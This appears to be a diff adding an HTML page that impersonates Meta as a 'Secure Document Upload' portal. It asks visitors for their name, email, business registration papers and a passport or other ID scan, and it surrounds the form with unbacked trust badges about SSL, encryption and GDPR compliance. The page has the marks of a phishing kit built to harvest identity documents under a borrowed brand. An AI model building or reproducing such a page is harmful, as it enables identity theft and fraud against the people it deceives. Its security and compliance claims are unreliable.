@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meta | Secure Document Upload</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="page-wrapper">
+    <header class="header">
+      <div class="badge">🔒 SSL Secured</div>
+      <div class="meta-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta Platforms Logo" />
+      </div>
+      <p class="tagline">Secure Document Submission • GDPR / CCPA Compliant</p>
+    </header>
+
+    <main class="card">
+      <h2>Submit Your Verification Documents</h2>
+      <p class="help">Please upload your required business document and a valid ID. Your data is transmitted over HTTPS and stored encrypted.</p>
+
+      <div id="error-box" class="alert error" style="display:none;"></div>
+      <div id="success-box" class="alert success" style="display:none;"></div>
+
+      <form id="upload-form">
+        <div class="row">
+          <div class="field">
+            <label for="full_name">Full Name *</label>
+            <input type="text" id="full_name" name="full_name" required placeholder="Jane Doe" />
+          </div>
+          <div class="field">
+            <label for="email">Email Address *</label>
+            <input type="email" id="email" name="email" required placeholder="jane@example.com" />
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="business_name">Business Name (optional)</label>
+          <input type="text" id="business_name" name="business_name" placeholder="Acme Ltd" />
+        </div>
+
+        <div class="section">
+          <h3>Business Document</h3>
+          <label for="business_doc_type">Select Document Type *</label>
+          <select id="business_doc_type" name="business_doc_type" required>
+            <option value="">-- Select Document Type --</option>
+            <option>Certificate of incorporation or registration</option>
+            <option>Extract from commercial register</option>
+            <option>Business license</option>
+            <option>Tax certificate</option>
+          </select>
+
+          <label for="business_docs" class="file-label">📎 Upload Business Document (PDF, DOCX, JPG/PNG — max 10MB)</label>
+          <input type="file" id="business_docs" name="business_docs" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" required />
+        </div>
+
+        <div class="section">
+          <h3>Valid ID</h3>
+          <label for="id_doc_type">Select ID Type *</label>
+          <select id="id_doc_type" name="id_doc_type" required>
+            <option value="">-- Select ID Type --</option>
+            <option>Passport</option>
+            <option>Identification card</option>
+            <option>Driving license</option>
+            <option>Permanent residence card</option>
+          </select>
+
+          <label for="id_file" class="file-label">📎 Upload Valid ID (PDF, JPG/PNG — max 10MB)</label>
+          <input type="file" id="id_file" name="id_file" accept=".pdf,.jpg,.jpeg,.png" required />
+        </div>
+
+        <label class="consent">
+          <input type="checkbox" id="consent" required />
+          <span>I consent to data processing according to the <a href="privacy.html" target="_blank">Privacy Policy</a> and <a href="terms.html" target="_blank">Terms</a>.</span>
+        </label>
+
+        <button class="btn" type="submit">🚀 Submit Securely</button>
+
+        <div class="trust">
+          <span>🛡️ Encrypted Storage</span>
+          <span>✅ GDPR / CCPA</span>
+          <span>🌐 HTTPS / TLS 1.3</span>
+        </div>
+      </form>
+    </main>
+
+    <footer>
+      <a href="privacy.html">Privacy</a> • <a href="terms.html">Terms</a> • <a href="mailto:support@meta.com">support@meta.com</a>
+      <div class="small">© 2025 Meta Platforms, Inc.</div>
+    </footer>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
